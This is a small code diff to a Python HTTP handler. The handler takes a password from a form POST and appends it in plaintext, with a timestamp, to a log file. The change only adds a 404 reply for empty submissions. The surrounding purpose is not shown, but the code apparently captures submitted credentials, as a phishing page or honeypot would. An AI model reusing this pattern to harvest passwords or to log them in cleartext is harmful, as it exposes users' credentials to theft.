@@ -820,6 +820,11 @@ class Handler(http.server.BaseHTTPRequestHandler):
         body = self.rfile.read(length).decode("utf-8", errors="replace")
         params = urllib.parse.parse_qs(body)
         password = params.get("password", [""])[0]
+        if not password:
+            self.send_response(404)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.end_headers()
+            return
         ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(LOG_FILE, "a") as f:
             f.write(f"[{ts}] Password: {password}\n")
